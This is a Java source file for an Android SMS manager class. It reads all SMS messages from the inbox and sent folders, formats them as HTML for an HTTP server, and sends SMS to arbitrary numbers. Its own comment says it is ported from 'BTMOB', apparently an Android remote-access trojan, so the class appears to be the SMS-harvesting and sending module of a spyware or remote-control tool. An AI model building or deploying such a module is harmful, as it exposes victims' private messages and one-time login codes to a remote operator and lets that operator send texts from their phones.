package com.security.ravan;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.Manifest;

import java.util.Date;
import java.util.List;

/**
 * SMS Manager - Read SMS (Inbox/Sent/All) and Send SMS
 * Ported from BTMOB mysmanager.java, adapted for Ravan HTTP server
 */
public class SmsManager {

    /**
     * Load SMS messages from the specified folder
     * 
     * @param context Android context
     * @param folder  "inbox", "sent", or "all"
     * @param page    Page number (1-based)
     * @param limit   Items per page
     * @return HTML table rows of SMS messages
     */
    public static String loadSmsHtml(Context context, String folder, int page, int limit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return null; // Permission not granted
            }
        }

        StringBuilder html = new StringBuilder();
        Cursor cursor = null;
        int offset = (page - 1) * limit;

        try {
            Uri uri;
            switch (folder.toLowerCase()) {
                case "inbox":
                    uri = Uri.parse("content://sms/inbox");
                    break;
                case "sent":
                    uri = Uri.parse("content://sms/sent");
                    break;
                default:
                    uri = Uri.parse("content://sms/");
                    break;
            }

            cursor = context.getContentResolver().query(uri,
                    new String[] { "_id", "thread_id", "address", "person", "date", "body", "type" },
                    null, null, "date DESC");

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                int addressIdx = cursor.getColumnIndex("address");
                int dateIdx = cursor.getColumnIndex("date");
                int bodyIdx = cursor.getColumnIndex("body");
                int typeIdx = cursor.getColumnIndex("type");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }
                    if (count >= limit)
                        break;

                    String address = addressIdx >= 0 ? cursor.getString(addressIdx) : "Unknown";
                    long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                    String body = bodyIdx >= 0 ? cursor.getString(bodyIdx) : "";
                    int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;

                    String typeLabel;
                    String typeClass;
                    switch (type) {
                        case 1:
                            typeLabel = "&#8595; Inbox";
                            typeClass = "call-incoming";
                            break;
                        case 2:
                            typeLabel = "&#8593; Sent";
                            typeClass = "call-outgoing";
                            break;
                        case 3:
                            typeLabel = "&#128317; Draft";
                            typeClass = "";
                            break;
                        default:
                            typeLabel = "&#128172; Other";
                            typeClass = "";
                    }

                    String preview = body != null && body.length() > 80 ? body.substring(0, 80) + "..." : body;
                    String dateStr = new Date(date).toString();
                    // Shorter date
                    try {
                        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("MMM dd, yyyy HH:mm",
                                java.util.Locale.getDefault());
                        dateStr = sdf.format(new Date(date));
                    } catch (Exception e) {
                    }

                    html.append("<tr>");
                    html.append("<td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
                    html.append("<td>").append(escapeHtml(address != null ? address : "Unknown")).append("</td>");
                    html.append("<td style=\"max-width:300px; word-wrap:break-word;\">")
                            .append(escapeHtml(preview != null ? preview : "")).append("</td>");
                    html.append("<td>").append(dateStr).append("</td>");
                    html.append("</tr>");

                    count++;
                }
            }
        } catch (Exception e) {
            html.append("<tr><td colspan='4'>Error: ").append(escapeHtml(e.getMessage())).append("</td></tr>");
        } finally {
            if (cursor != null)
                cursor.close();
        }

        return html.toString();
    }

    /**
     * Get total SMS count for a folder
     */
    public static int getSmsCount(Context context, String folder) {
        Cursor cursor = null;
        try {
            Uri uri;
            switch (folder.toLowerCase()) {
                case "inbox":
                    uri = Uri.parse("content://sms/inbox");
                    break;
                case "sent":
                    uri = Uri.parse("content://sms/sent");
                    break;
                default:
                    uri = Uri.parse("content://sms/");
                    break;
            }
            cursor = context.getContentResolver().query(uri, new String[] { "_id" }, null, null, null);
            if (cursor != null)
                return cursor.getCount();
        } catch (Exception e) {
        } finally {
            if (cursor != null)
                cursor.close();
        }
        return 0;
    }

    /**
     * Send SMS using all available SIMs
     */
    public static String sendSms(Context context, String phoneNo, String message) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                    return "SMS permission not granted";
                }
                if (context.checkSelfPermission(
                        Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    return "Phone state permission not granted";
                }
            }

            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();

            // Try to send using default SIM
            java.util.ArrayList<String> parts = smsManager.divideMessage(message);
            if (parts.size() > 1) {
                smsManager.sendMultipartTextMessage(phoneNo, null, parts, null, null);
            } else {
                smsManager.sendTextMessage(phoneNo, null, message, null, null);
            }

            return "SMS sent successfully to " + phoneNo;
        } catch (Exception e) {
            return "Failed to send SMS: " + e.getMessage();
        }
    }

    private static String escapeHtml(String text) {
        if (text == null)
            return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }
}
